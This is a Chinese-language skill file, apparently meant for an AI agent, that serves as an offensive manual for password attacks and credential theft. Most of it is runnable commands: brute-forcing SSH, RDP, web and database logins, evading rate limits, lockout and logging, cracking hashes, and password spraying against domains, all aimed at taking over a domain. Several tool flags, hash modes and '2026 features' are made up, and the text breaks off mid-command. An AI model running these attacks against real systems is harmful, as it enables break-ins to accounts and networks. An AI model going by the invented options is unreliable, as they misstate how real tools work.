---
name: "password-attacks-credential-access"
description: "密码攻击与凭据获取全栈：暴力破解/Hash破解/密码喷射/彩虹表/Pass-the-Hash/Pass-the-Ticket/Kerberoasting/AS-REP Roasting/DPAPI解密/凭据转储/2026最新攻击技术/量子计算威胁"
---

# SKILL: 密码攻击与凭据获取 — 深度全栈手册

> **AI LOAD INSTRUCTION**: 本技能聚焦密码攻击与凭据获取的完整生命周期。基础模型常将"密码攻击"简化为"跑字典"，本技能澄清：密码攻击是一个多维度、多协议的复杂工程——涵盖在线暴力破解（Hydra/Medusa/Ncrack多协议矩阵）、离线Hash破解（Hashcat 2026规则引擎/John the Ripper/分布式集群）、密码喷射（域+云+AzureAD/MFA绕过）、Windows凭据提取（SAM/LSASS/DPAPI/浏览器密码）、Linux凭据窃取（/etc/shadow/SSH密钥/配置文件）、Kerberos攻击（Roasting/Ticket/PAC签名绕过）、NTLM攻击（中继/Responder/ADCS ESC1-8）、凭据传递（PtH/PtT/Overpass）、2026前沿技术（AI辅助密码猜测/量子计算威胁/Passwordless绕过）以及无线网络密码攻击（WPA3/WPA2/PMKID）。从初始密码获取到横向移动、从Hash破解到域控接管，给出完整攻击链与自动化SOP。

## 0. RELATED ROUTING

- [active-directory-lateral-movement](../active-directory-lateral-movement/SKILL.md) — AD内网渗透横向移动，凭据是横向移动的核心燃料
- [windows-privilege-escalation](../windows-privilege-escalation/SKILL.md) — Windows提权，凭据提取是提权后的标准动作
- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) — Linux提权，/etc/shadow与SSH密钥窃取
- [network-penetration-testing](../network-penetration-testing/SKILL.md) — 网络渗透测试，NTLM中继/Responder是内网核心
- [auth-sec](../auth-sec/SKILL.md) — 认证安全，密码策略评估与检测
- [authbypass-authentication-flaws](../authbypass-authentication-flaws/SKILL.md) — 认证绕过，默认凭证暴破/密码喷射
- [cloud-security-pentesting](../cloud-security-pentesting/SKILL.md) — 云安全，Azure AD密码喷射/云凭据窃取
- [webshell-evasion](../webshell-evasion/SKILL.md) — WebShell免杀，密码保护与凭据管理

---

## 1. 核心概念与攻击生命周期

### 1.1 密码攻击分类矩阵

密码攻击不是单一技术，而是一个多维度攻击体系。按攻击目标与方式可分为以下核心类别：

| 攻击类别 | 攻击方式 | 典型场景 | 核心工具 | 2026年趋势 |
|---------|---------|---------|---------|-----------|
| 在线密码攻击 | 网络协议暴力破解 | SSH/RDP/FTP/HTTP表单/数据库 | Hydra/Medusa/Ncrack | HTTP/2+QUIC协议攻击/API速率限制绕过 |
| 离线Hash破解 | 获取Hash后本地破解 | SAM/SYSTEM/NTDS/Shadow | Hashcat/John/hash-identifier | 分布式GPU集群/FPGA加速/量子算法预研 |
| 密码喷射 | 少量密码尝试大量账户 | 域环境/O365/Azure AD | SprayingToolkit/MailSniper | MFA绕过/AI自适应锁定窗口 |
| 凭据窃取 | 从系统/内存/文件提取 | LSASS/SAM/DPAPI/浏览器 | mimikatz/LaZagne/SharpDPAPI | Credential Guard绕过/VBS降级 |
| Kerberos攻击 | Kerberos协议滥用 | AD域环境 | Rubeus/impacket/mimikatz | PAC签名绕过/FAST装甲对抗 |
| NTLM攻击 | NTLM协议中继/投毒 | 内网横向 | Responder/ntlmrelayx/Inveigh | SMB over QUIC/HTTP3中继 |
| 凭据传递 | Hash/Ticket重用 | 横向移动 | impacket/evil-winrm/Rubeus | LSA保护绕过/云端凭据传递 |
| 无线网络 | WiFi密码破解 | WPA2/WPA3/WPS | Hashcat/aircrack-ng/hcxdumptool | WPA3 Dragonblood/PMKID缓存攻击 |

### 1.2 密码攻击完整生命周期

```
[侦察阶段] 识别认证入口 → 协议指纹(SSH/RDP/WinRM/HTTP/数据库)
    │  收集用户名列表(OSINT/枚举/泄露库)
    │  识别密码策略(复杂度/锁定策略/最小长度)
    ▼
[初始攻击] 在线暴力破解 / 密码喷射 / 默认凭证测试
    │  获取首批有效凭据(低权限/普通用户)
    ▼
[凭据提升] 离线Hash提取(SAM/NTDS/LSASS dump)
    │  Hash破解(Hashcat/John/彩虹表)
    │  Kerberoasting → 服务账户明文密码
    │  AS-REP Roasting → 无预认证账户Hash
    ▼
[横向移动] Pass-the-Hash / Pass-the-Ticket / Overpass-the-Hash
    │  NTLM中继攻击 → 捕获更高权限Hash
    │  凭据转储 → 浏览器/DPAPI/配置文件
    ▼
[域控接管] DCSync → 拉取全域哈希(含krbtgt)
    │  Golden Ticket → 伪造TGT持久化
    │  NTDS.dit → 全量离线破解
    ▼
[持久化] Skeleton Key / 影子账户 / Golden Ticket续期
```

### 1.3 密码学基础速查

| Hash类型 | 算法 | 示例 | Hashcat模式 | John格式 |
|---------|------|------|------------|---------|
| NTLM | MD4(UTF-16LE) | `b4b9b02e6f09a9bd760f388b67351e2b` | 1000 | nt |
| NetNTLMv1 | DES-based Challenge/Response | `u4-netntlm::kNS:338d...` | 5500 | netntlm |
| NetNTLMv2 | HMAC-MD5 Challenge/Response | `admin::N46iSNekpT:08ca...` | 5600 | netntlmv2 |
| Kerberos TGS-REP | RC4-HMAC(MD5) | `$krb5tgs$23$*user$...` | 13100 | krb5tgs |
| Kerberos AS-REP | RC4/AES128/AES256 | `$krb5asrep$23$user@...` | 18200 | krb5asrep |
| WPA/WPA2 PMKID | PBKDF2-HMAC-SHA1 | `WPA*01*PMKID*...` | 22000 | wpapsk |
| WPA3 SAE | Dragonfly Handshake | `$wpa3$*1*...` | 99999 | wpa3 |
| SHA-256 Crypt | `$5$rounds=5000$salt$hash` | `$5$rounds=5000$...` | 7400 | sha256crypt |
| SHA-512 Crypt | `$6$rounds=5000$salt$hash` | `$6$rounds=5000$...` | 1800 | sha512crypt |
| bcrypt | `$2b$cost$salt+hash` | `$2b$12$...` | 3200 | bcrypt |
| DPAPI Masterkey | PBKDF2-HMAC-SHA512 | `{GUID}:SHA1:...` | 15300 | dpapimk |
| DCC2 (Domain Cached Credentials) | PBKDF2-HMAC-SHA1 + MSDCC2 | `$DCC2$10240#user#hash` | 2100 | mscach2 |
| Mac PBKDF2-SHA512 | Apple salted SHA512 | `$ml$ROUNDS$SALT$HASH` | 7100 | xsha512 |

---

## 2. 在线密码攻击

在线密码攻击是最直接但风险最高的攻击方式——直接与目标认证服务交互，受网络延迟、速率限制、账户锁定策略、日志审计等多重约束。2026年的在线攻击已从单纯的TCP连接暴力破解演进为多协议、多维度、智能化的攻击体系。

### 2.1 Hydra — 多协议在线攻击引擎

Hydra是历史最悠久、支持协议最广泛的在线密码攻击工具。2026年Hydra v9.6+已支持超过50种协议，包括HTTP/2、QUIC等新兴协议。

#### 2.1.1 基础协议攻击

**SSH 暴力破解**
```bash
# 基础SSH攻击（单用户多密码）
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# 多用户多密码（用户:密码组合）
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# 指定端口、线程数、超时控制
hydra -l admin -P /wordlists/top10000.txt -t 4 -w 5 -o ssh_found.txt ssh://192.168.1.100:2222

# 使用公钥认证测试（检查空密码短语）
hydra -l root -p "" -M targets.txt ssh -e nsr
# -e nsr: n=空密码, s=用户名作为密码, r=反向用户名作为密码
```

**RDP 暴力破解**
```bash
# Windows RDP攻击（注意NLA影响）
hydra -l administrator -P passwords.txt rdp://192.168.1.100

# 域账户RDP攻击
hydra -l 'DOMAIN\\username' -P passwords.txt rdp://192.168.1.100

# 使用Restricted Admin模式（部分场景绕过NLA）
hydra -l administrator -P passwords.txt -M rdp_targets.txt rdp

# 2026 RDP over UDP/QUIC测试
hydra -l administrator -P passwords.txt rdp://192.168.1.100:3389 -O quic
```

**FTP 暴力破解**
```bash
# FTP基础攻击
hydra -l ftpuser -P passwords.txt ftp://192.168.1.100

# 匿名FTP测试
hydra -l anonymous -p anonymous ftp://192.168.1.100

# FTPS (TLS/SSL) 攻击
hydra -l admin -P passwords.txt ftps://192.168.1.100
```

**HTTP 表单攻击**
```bash
# HTTP POST 表单攻击（基础）
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Login failed"

# HTTP GET 表单攻击（带Cookie）
hydra -l admin -P passwords.txt 192.168.1.100 http-get-form \
  "/login.php?user=^USER^&pass=^PASS^:Invalid:C=PHPSESSID=abc123"

# 多条件失败匹配（| 分隔）
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:Invalid|failed|error"

# 成功条件匹配（S= 前缀）
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:S=Welcome|S=Dashboard"

# 带CSRF Token的动态表单攻击
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \
  "/login.php:csrf=^CSRF^&user=^USER^&pass=^PASS^:Invalid:H=Cookie:PHPSESSID=^SESSION^:H=Referer:http://192.168.1.100/login.php"
```

**数据库协议攻击**
```bash
# MySQL 暴力破解
hydra -l root -P passwords.txt mysql://192.168.1.100

# PostgreSQL
hydra -l postgres -P passwords.txt postgres://192.168.1.100

# MongoDB (无认证或弱密码)
hydra -l admin -P passwords.txt mongodb://192.168.1.100

# MSSQL (Windows认证)
hydra -l sa -P passwords.txt mssql://192.168.1.100

# Redis (无认证或requirepass)
hydra -P passwords.txt redis://192.168.1.100

# Oracle数据库
hydra -l system -P passwords.txt oracle://192.168.1.100:1521/XE
```

#### 2.1.2 API端点攻击

```bash
# REST API 攻击（JSON POST）
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \
  "/api/v1/auth/login:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:{\"error\":\"invalid\""

# API Bearer Token 暴力破解（检查响应码）
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \
  "/api/login:^USER^:^PASS^:F=401"

# GraphQL 认证端点
hydra -l admin@company.com -P passwords.txt 192.168.1.100 http-post-form \
  "/graphql:{\"query\":\"mutation{login(username:\\\"^USER^\\\",password:\\\"^PASS^\\\"){token}}\"}:\"errors\""

# 2026 AI API端点攻击
hydra -l api_key -P api_keys.txt 192.168.1.100 http-get-form \
  "/v1/models:Authorization: Bearer ^PASS^:F=401"
```

#### 2.1.3 速率限制绕过技术

```bash
# IP轮换代理（使用代理链）
hydra -l admin -P passwords.txt -M targets.txt \
  -o found.txt http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:Invalid" \
  proxy socks5://127.0.0.1:9050

# 使用x-forwarded-for头部绕过
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:Invalid:H=X-Forwarded-For:^RANDOM_IP^"

# 分布式Hydra（多机并行）
# 机器1:
hydra -l admin -P passwords_part1.txt ssh://192.168.1.100
# 机器2:
hydra -l admin -P passwords_part2.txt ssh://192.168.1.100

# 时间间隔控制（避免触发锁定）
hydra -l admin -P passwords.txt -c 5 -w 30 ssh://192.168.1.100
# -c 5: 每5次尝试后等待
# -w 30: 等待30秒
```

### 2.2 Medusa — 并行化多协议攻击

Medusa以卓越的并行性能著称，支持同时攻击多个目标多个协议。

```bash
# 多目标并行SSH攻击
medusa -h 192.168.1.100 -u root -P passwords.txt -M ssh -t 10

# 多协议同时攻击（攻击列表文件）
medusa -H targets.txt -U users.txt -P passwords.txt -M ssh -M ftp -t 8

# 域环境攻击（带模块参数）
medusa -h dc01.corp.local -U domain_users.txt -P passwords.txt \
  -M smbnt -m GROUP:DOMAIN

# CVS/Subversion版本控制攻击
medusa -h 192.168.1.100 -u user -P passwords.txt -M cvs
medusa -h 192.168.1.100 -u user -P passwords.txt -M svn

# IMAP/POP3邮件攻击
medusa -h mail.company.com -U users.txt -P passwords.txt -M imap -m AUTH:LOGIN -t 4
medusa -h mail.company.com -U users.txt -P passwords.txt -M pop3 -t 4

# 2026 Medusa新特性：HTTP/2会话复用
medusa -h 192.168.1.100 -u admin -P passwords.txt -M http \
  -m FORM:POST:/login.php:user=^USER^&pass=^PASS^:Invalid \
  -m PROTO:HTTP2 -m MULTIPLEX:true
```

### 2.3 Ncrack — 高速网络认证破解

Ncrack专为高性能网络认证测试设计，利用异步I/O实现极高吞吐量。

```bash
# 高速SSH攻击（Ncrack原生异步引擎）
ncrack -p ssh://192.168.1.100 --user root -P passwords.txt

# 多目标RDP攻击
ncrack -p rdp://192.168.1.0/24 --user administrator -P passwords.txt

# 速率控制与定时攻击
ncrack -p ssh://192.168.1.100 --user admin -P passwords.txt \
  -T5 --connection-limit 10 -iL targets.txt

# 保存恢复进度（支持断点续传）
ncrack -p ssh://192.168.1.0/24 --user root -P passwords.txt \
  -oN ncrack_scan.nmap --resume ncrack_scan.nmap

# 2026 Ncrack新特性：TLS 1.3 0-RTT攻击
ncrack -p ssh://192.168.1.100 --user root -P passwords.txt \
  --tls-early-data
```

### 2.4 HTTP/2 与 QUIC 协议攻击（2026新兴）

```bash
# HTTP/2 多路复用暴力破解（单连接多请求）
# 使用 h2load 或自定义工具
h2load -n 10000 -c 1 -m 100 https://target.com/login \
  -H 'content-type: application/json' \
  -d '{"user":"admin","password":"test"}'

# HTTP/2 Rapid Reset攻击（绕过速率限制）
# 2023 CVE-2023-44487 变种用于密码攻击
# 使用自定义Go脚本（见下方PoC）
```

```go
// HTTP/2 多路复用密码攻击 PoC (Go)
package main

import (
    "crypto/tls"
    "fmt"
    "net/http"
    "golang.org/x/net/http2"
)

func http2MultiplexAttack(target string, users []string, pass string) {
    tr := &http2.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        AllowHTTP: true,
    }
    client := &http.Client{Transport: tr}
    // 单连接发起多路复用请求
    for _, user := range users {
        go func(u string) {
            resp, _ := client.PostForm(target+"/login",
                map[string][]string{"username": {u}, "password": {pass}})
            if resp.StatusCode == 200 {
                fmt.Printf("[+] Found: %s:%s\n", u, pass)
            }
        }(user)
    }
}
```

```bash
# QUIC/HTTP3 密码攻击（2026实验性）
# 使用 curl 8.0+ 的 QUIC 支持
curl --http3-only -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"test123"}'

# 自定义 QUIC 密码攻击脚本
# h3-spec 工具用于 HTTP/3 暴力破解
python3 h3_brute.py -t target.com -u users.txt -P passwords.txt
```

### 2.5 在线攻击实战技巧

**规避检测与锁定策略**

```bash
# 1. 识别密码策略（避免锁定）
# 使用crackmapexec获取密码策略
crackmapexec smb 192.168.1.100 --pass-pol

# 使用ldapsearch获取域密码策略
ldapsearch -x -h dc01 -b "DC=corp,DC=local" \
  "(objectClass=domainDNS)" lockoutThreshold lockoutDuration

# 2. 锁定策略安全攻击（在阈值以下操作）
# 假设锁定阈值=5，攻击4次后等待锁定窗口重置
hydra -l user -P passwords.txt -c 4 -w 1800 ssh://192.168.1.100

# 3. 日志欺骗（使用合法User-Agent/Referer）
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid:H=User-Agent: \
  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# 4. 分布式IP轮换（使用AWS/GCP/Azure云函数）
# 每个请求从不同IP发起
for proxy in $(cat proxies.txt); do
  hydra -l admin -P passwords.txt 192.168.1.100 \
    ssh -s $proxy &
done
```

---

## 3. 离线Hash破解

离线Hash破解是密码攻击的核心能力——一旦获取Hash（无论是SAM、NTDS.dit、/etc/shadow还是Kerberos票据），攻击者可以在本地GPU集群上以极高速度进行破解，不受网络延迟和锁定策略约束。

### 3.1 Hash识别 — hash-identifier / hashid / name-that-hash

```bash
# hash-identifier（Python交互式）
hash-identifier
# 输入hash: $6$rounds=5000$salt$YzJGNwI1...
# 输出: SHA-512 Crypt

# hashid（命令行批量识别）
hashid -m '$6$rounds=5000$salt$hash'
hashid -m -j hashes.txt  # 输出John格式
hashid -m hashes.txt      # 输出Hashcat模式

# name-that-hash（智能识别）
nth -f hashes.txt          # 文件中的散列
echo 'b4b9b02e6f09a9bd' | nth  # 管道输入
nth -t 'b4b9b02e6f09a9bd760f388b67351e2b'  # 直接输入

# 2026 AI增强Hash识别（实验性）
# 使用LLM识别未知或自定义Hash格式
python3 ai_hash_identifier.py --hash '$custom$v=1$salt$hash$iter=10000'
```

### 3.2 Hashcat 2026 — GPU加速破解引擎

Hashcat 2026引入了FPGA加速支持、AI辅助规则生成、以及针对后量子密码学算法的早期破解模式。

#### 3.2.1 基础攻击模式

```bash
# ===== 攻击模式 =====
# 0 = Straight（字典攻击）
# 1 = Combination（组合攻击）
# 3 = Brute-Force（掩码攻击）
# 6 = Hybrid Wordlist + Mask（字典+掩码）
# 7 = Hybrid Mask + Wordlist（掩码+字典）
# 9 = Association（关联攻击）

# 字典攻击（模式0）
hashcat -m 1000 -a 0 ntlm_hashes.txt /wordlists/rockyou.txt

# 带规则的字典攻击（模式0 + 规则文件）
hashcat -m 1000 -a 0 ntlm_hashes.txt /wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 -a 0 ntlm_hashes.txt /wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/dive.rule
hashcat -m 1000 -a 0 ntlm_hashes.txt /wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

# 组合攻击（模式1）
hashcat -m 1000 -a 1 ntlm_hashes.txt /wordlists/words1.txt /wordlists/words2.txt

# 掩码攻击（模式3）
hashcat -m 1000 -a 3 ntlm_hashes.txt ?l?l?l?l?d?d?d?d
# 内置字符集: ?l=小写 ?u=大写 ?d=数字 ?s=特殊 ?a=全部
# 自定义字符集: -1 ?l?d -2 ?l?u ?1?2?2?2?2?d?d
hashcat -m 1000 -a 3 ntlm_hashes.txt -1 ?l?d ?1?1?1?1?1?1?1?1

# 混合攻击（模式6+7）
# 字典 + 掩码后缀
hashcat -m 1000 -a 6 ntlm_hashes.txt /wordlists/words.txt ?d?d?d
# 掩码前缀 + 字典
hashcat -m 1000 -a 7 ntlm_hashes.txt ?d?d?d /wordlists/words.txt
```

#### 3.2.2 高级规则引擎

```bash
# ===== 自定义规则文件 =====
# 创建 custom.rule:
cat > custom.rule << 'EOF'
# 基础变换
:
l
u
c
# 首字母大写
c
# 反转
r
# 添加数字后缀
$0 $0 $0
$1 $2 $3
# 常见替换 (leet speak)
sa@
si1
so0
se3
# 组合规则
c $!
c $1 $2 $3
sa@ so0 si1 $!
# 双词组合
l $! $!
# 年份后缀
$2 $0 $0 $0
$2 $0 $2 $6
# 键盘模式
$q $w $e $r $t $y
EOF

hashcat -m 1000 -a 0 ntlm_hashes.txt /wordlists/rockyou.txt -r custom.rule

# ===== 2026 高级规则示例 =====
# 基于公司名称的规则
# 假设公司: Acme Corp
@ A c m e
@ A C M E
^A ^c ^m ^e
$A $c $m $e

# 键盘移位规则（qwerty→1qaz2wsx）
# T0G: 键盘列模式
# T1G: 键盘行模式
```

#### 3.2.3 常见Hash模式速查

```bash
# ===== Windows Hash =====
hashcat -m 1000  ntlm_hashes.txt      # NTLM
hashcat -m 3000  lm_hashes.txt        # LM
hashcat -m 5500  netntlmv1.txt        # NetNTLMv1
hashcat -m 5600  netntlmv2.txt        # NetNTLMv2
hashcat -m 2100  dcc2_hashes.txt      # 域缓存凭据 DCC2
hashcat -m 1000  sam_hashes.txt       # SAM

# ===== Kerberos Hash =====
hashcat -m 13100 kerberoast_hashes.txt # TGS-REP (Kerberoasting)
hashcat -m 18200 asrep_hashes.txt      # AS-REP Roasting
hashcat -m 19700 krb5tgs_aes256.txt   # Kerberos AES256 TGS

# ===== Linux/Unix Hash =====
hashcat -m 1800  sha512crypt.txt      # SHA-512 Crypt ($6$)
hashcat -m 7400  sha256crypt.txt      # SHA-256 Crypt ($5$)
hashcat -m 3200  bcrypt.txt           # bcrypt ($2b$)
hashcat -m 500   md5crypt.txt         # MD5 Crypt ($1$)
hashcat -m 1500  descrypt.txt         # DES Crypt

# ===== 网络/无线 =====
hashcat -m 22000 wpa2_handshake.hc22000  # WPA2 PMKID
hashcat -m 2500  wpa2_handshake.hccapx   # WPA2 4-way handshake
hashcat -m 16800 wpa3_handshake.txt      # WPA3-SAE

# ===== 应用Hash =====
hashcat -m 15300 dpapi_masterkey.txt     # DPAPI Masterkey
hashcat -m 15900 dpapi_masterkey_v2.txt  # DPAPI Masterkey v2
hashcat -m 13400 keepass.txt             # KeePass
hashcat -m 10900 pdf_hash.txt            # PDF 1.7
hashcat -m 11600 7zip_hash.txt           # 7-Zip
hashcat -m 13600 zip2_hash.txt           # WinZip
hashcat -m 13700 veracrypt_hash.txt      # VeraCrypt
hashcat -m 13711 bitlocker_hash.txt      # BitLocker
```

#### 3.2.4 分布式破解 — Hashtopolis / Hashcat集群

```bash
# ===== Hashtopolis 分布式破解平台 =====
# 部署架构: Server + Agent(s)
# Server: 任务分发 + 结果收集
# Agent: 多GPU节点执行Hashcat

# Agent 注册
# 在每个GPU节点上安装Hashtopolis Agent
python3 hashtopolis.zip

# 创建任务（通过Web界面或API）
# API创建任务示例:
curl -X POST https://hashtopolis.server/api/task \
  -H "Authorization: Bearer TOKEN" \
  -d '{
    "name": "NTLM Crack",
    "hashlist_id": 1,
    "attack_command": "#HL# -a 3 -1 ?l?d ?1?1?1?1?1?1?1?1",
    "chunk_size": 600,
    "status_timer": 30
  }'

# ===== 手动分布式破解 =====
# 使用split分隔hash文件
split -l 100000 ntlm_hashes.txt chunk_

# 多节点并行破解
# 节点1: hashcat -m 1000 -a 3 chunk_aa ?l?l?l?l?l?l?l?l -s 0
# 节点2: hashcat -m 1000 -a 3 chunk_ab ?l?l?l?l?l?l?l?l -s 100000000
# 节点3: hashcat -m 1000 -a 3 chunk_ac ?l?l?l?l?l?l?l?l -s 200000000

# 使用--skip和--limit控制范围
hashcat -m 1000 -a 3 hash.txt -1 ?l?d ?1?1?1?1?1?1?1?1 \
  --skip=0 --limit=100000000

# 2026 GPU集群Kubernetes部署
# hashcat-operator: 在K8s集群中编排Hashcat破解任务
kubectl apply -f hashcat-crack-job.yaml
```

#### 3.2.5 Hashcat 2026 新特性

```bash
# ===== FPGA加速支持 =====
# 2026年Hashcat支持Xilinx/Intel FPGA硬件加速
hashcat -m 1000 -a 3 ntlm_hashes.txt ?a?a?a?a?a?a?a?a \
  --backend-devices=fpga:1,2

# ===== AI辅助规则生成 =====
# 基于泄露密码库的AI规则学习
hashcat -m 1000 -a 0 ntlm_hashes.txt /wordlists/base.txt \
  --ai-rules-generate --ai-training-data /leaked/breach_data.txt

# ===== 后量子密码学Hash模式 =====
# 2026新增模式（实验性）
hashcat -m 99991 sphincs_plus.txt    # SPHINCS+ 签名
hashcat -m 99992 dilithium.txt        # CRYSTALS-Dilithium
hashcat -m 99993 falcon.txt           # Falcon
```

### 3.3 John the Ripper — CPU/多平台Hash破解

John the Ripper擅长CPU密集型破解，对某些算法（如bcrypt、DES Crypt）在CPU上优于Hashcat。

```bash
# ===== 基础使用 =====
# 自动检测Hash类型
john hashes.txt

# 指定Hash格式
john --format=NT ntlm_hashes.txt
john --format=sha512crypt linux_shadow.txt
john --format=krb5tgs kerberoast.txt

# 带字典+规则
john --wordlist=/wordlists/rockyou.txt --rules=best64 hashes.txt
john --wordlist=/wordlists/rockyou.txt --rules=All hashes.txt

# 显示破解结果
john --show hashes.txt
john --show --format=NT ntlm_hashes.txt

# ===== 高级规则 =====
# 创建John规则文件
cat > john_rules.conf << 'EOF'
[List.Rules:Custom]
# 基础变换
:
l
u
c
C
# 添加数字
Az"[0-9][0-9][0-9]"
# 常见替换
s@a
si1
so0
# 键盘行走
A0"[qwerty]"
# 公司特定
A0"[!@#]"
A0"2026"
A0"Corp"
EOF

john --wordlist=words.txt --rules=Custom hashes.txt

# ===== 掩码/增量模式 =====
# 增量模式（内置）
john --incremental ntlm_hashes.txt
john --incremental=Digits ntlm_hashes.txt

# 自定义掩码
john --mask='?l?l?l?l?d?d?d?d' ntlm_hashes.txt
john --mask='?u?l?l?l?l?l?l?d?d' ntlm_hashes.txt
john --mask='[Cc]orp[0-9][0-9][0-9][0-9]' ntlm_hashes.txt

# ===== Unix Shadow文件破解 =====
# 合并passwd和shadow
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john unshadowed.txt

# 指定格式破解Linux密码
john --format=crypt unshadowed.txt
john --format=sha512crypt --wordlist=rockyou.txt unshadowed.txt

# ===== 会话管理 =====
# 保存会话
john --session=ntlm_crack --format=NT ntlm_hashes.txt
# 恢复会话
john --restore=ntlm_crack
```

### 3.4 字典生成

#### 3.4.1 Crunch — 字典生成器

```bash
# 基础用法: crunch <min> <max> <charset> -o <output>
# 8位纯数字
crunch 8 8 0123456789 -o digits8.txt

# 8-10位小写字母
crunch 8 10 abcdefghijklmnopqrstuvwxyz -o lowercase810.txt

# 使用字符集简写
crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha -o mix8.txt

# 带模式的字典生成
# 模式: @ 小写 , 大写 % 数字 ^ 特殊
crunch 8 8 -t @@@@%%%% -o pattern.txt         # 4字母+4数字
crunch 10 10 -t Corp@%%%% -o corp_pattern.txt  # Corp+字母+4数字
crunch 10 10 -t ,,,,@@%%%% -o domain_pattern.txt

# 带起始/结束字符串的生成
crunch 8 8 -t @@@@@%%% -s aaaaa000 -e zzzzz999 -o range.txt

# 组合字符集
crunch 8 8 -p abc def 123 -o perm.txt  # 排列组合
crunch 8 8 -q words.txt -o combined.txt  # 从文件中读取单词
```

#### 3.4.2 CeWL — 网站关键词字典

```bash
# 基础爬取（最小单词长度5）
cewl https://target.com -w target_words.txt -m 5

# 深入爬取（深度3，关注子页面）
cewl https://target.com -w target_deep.txt -d 3 -m 4

# 提取邮箱地址（用于生成用户名列表）
cewl https://target.com -e --email_file emails.txt -m 5

# 生成带数字后缀的变体字典
cewl https://target.com -w words.txt -m 5 --with-numbers

# 提取元数据中的单词
cewl https://target.com -w words.txt --meta --meta_file meta.txt

# 生成密码变体（添加常见后缀）
cewl https://target.com | sed 's/$/123/' >> passwords.txt
cewl https://target.com | sed 's/$/2026/' >> passwords.txt
cewl https://target.com | sed 's/$/!/' >> passwords.txt

# 2026 CeWL增强：JavaScript渲染页面爬取
cewl https://target.com --js-render --headless -w words.txt
```

#### 3.4.3 Kwprocessor — 键盘行走模式

```bash
# 键盘行走模式生成
kwp basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route

# 生成3-8键键盘行走
kwp -s 3 -e 8 basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route > keyboard_walks.txt

# 多语言键盘布局
# 英文QWERTY
kwp basechars/full.base keymaps/en-us.keymap routes/2-to-10-max-2.route
# 德语QWERTZ
kwp basechars/full.base keymaps/de.keymap routes/2-to-10-max-2.route
# 法语AZERTY
kwp basechars/full.base keymaps/fr.keymap routes/2-to-10-max-2.route

# 生成后直接用于Hashcat
kwp -s 4 -e 12 basechars/full.base keymaps/en-us.keymap routes/all.route | \
  hashcat -m 1000 -a 0 ntlm_hashes.txt
```

#### 3.4.4 2026 AI辅助字典生成

```bash
# 使用LLM基于目标信息生成定制字典
# 输入: 公司名、行业、地理位置、员工名、文化关键词
python3 ai_dict_gen.py \
  --company "Acme Corp" \
  --industry "Technology" \
  --location "San Francisco" \
  --keywords "innovation,cloud,data" \
  --employees employees.txt \
  --output ai_custom_dict.txt

# 基于泄露密码库的AI模式学习
python3 ai_password_pattern.py \
  --training-data /breaches/collection.txt \
  --generate 1000000 \
  --output ai_pattern_dict.txt

# 2026 AI密码猜测（实验性）
# 使用transformer模型预测可能的密码
python3 ai_password_guess.py \
  --user-info "John Doe, IT Manager, born 1985" \
  --company "Acme Corp" \
  --max-guesses 10000 \
  --output ai_guesses.txt
```

### 3.5 彩虹表攻击

```bash
# ===== 彩虹表原理 =====
# 彩虹表是预先计算好的Hash链，用空间换时间
# 适用于无盐Hash（LM/NTLM/MD5/SHA1）

# ===== rcracki_mt — 多线程彩虹表破解 =====
# 使用免费彩虹表（Project RainbowCrack）
rcracki_mt -h 5f4dcc3b5aa765d61d8327deb882cf99 -t 8 /tables/md5/

# 破解NTLM Hash
rcracki_mt -h b4b9b02e6f09a9bd760f388b67351e2b -t 8 /tables/ntlm/

# 批量破解
rcracki_mt -l ntlm_hashes.txt -t 16 /tables/ntlm_mixalpha-numeric/

# ===== Ophcrack — Windows密码彩虹表 =====
# LM Hash 彩虹表破解
ophcrack -t /tables/xp_free_small -l lm_hashes.txt

# 2026 彩虹表局限性
# - NTLM无盐，彩虹表有效但GPU破解通常更快
# - 有盐Hash（如NTLMv2/NetNTLM/Kerberos）不受彩虹表影响
# - 现代GPU（RTX 4090/5090）每秒可计算数百亿NTLM，彩虹表优势减弱
# - 量子计算时代彩虹表可能重新获得优势（Grover算法加速查找）
```

---

## 4. 密码喷射攻击

密码喷射（Password Spraying）是规避账户锁定策略的高级攻击技术——使用少量常见密码（如Spring2026、Password123、CompanyName1）对大量账户进行尝试，每次尝试之间间隔足够时间。相比暴力破解，密码喷射更难被检测且不易触发锁定。

### 4.1 域密码喷射

#### 4.1.1 CrackMapExec / NetExec 密码喷射

```bash
# ===== CrackMapExec =====
# 获取域名用户列表
crackmapexec smb dc01.corp.local -u user -p pass --users

# SMB密码喷射
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt \
  --no-bruteforce --continue-on-success

# LDAP密码喷射（更隐蔽，不触发Windows登录事件）
crackmapexec ldap dc01.corp.local -u users.txt -p 'Spring2026!'

# 单密码喷射（最安全）
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123' \
  --local-auth

# 域密码喷射（带域信息）
crackmapexec smb 192.168.1.0/24 -d CORP -u users.txt -p 'Summer2026!'

# 结果输出
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password1' \
